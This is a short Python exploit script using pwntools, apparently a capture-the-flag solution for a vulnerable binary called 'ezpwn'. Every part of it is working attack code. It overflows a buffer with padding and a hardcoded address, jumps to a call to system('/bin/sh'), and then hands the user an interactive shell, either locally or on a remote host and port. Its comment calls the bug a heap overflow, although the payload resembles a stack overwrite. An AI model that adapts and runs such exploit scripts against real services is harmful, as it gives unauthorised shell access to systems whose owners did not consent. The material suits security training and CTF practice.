#!/usr/bin/env python

# no protection
# heap overflow
from pwn import *

g_fname = "./ezpwn"
g_elf = ELF(g_fname)
context.binary = g_elf
if (args.REMOTE):
    rhost, rport = args.REMOTE.split(":")
    g_io = remote(rhost, int(rport))
else:
    g_io = process(g_fname)

def pwn():
    # call to system("/bin/sh")
    addr_call_system = 0x804864C
    pad_len = 0x18 + 4
    g_io.sendafter("?\n", flat(['a'*pad_len, addr_call_system]))

if ("__main__" == __name__):
    if (args.DEBUG):
        context.log_level = "debug"
    pwn()
    g_io.interactive()
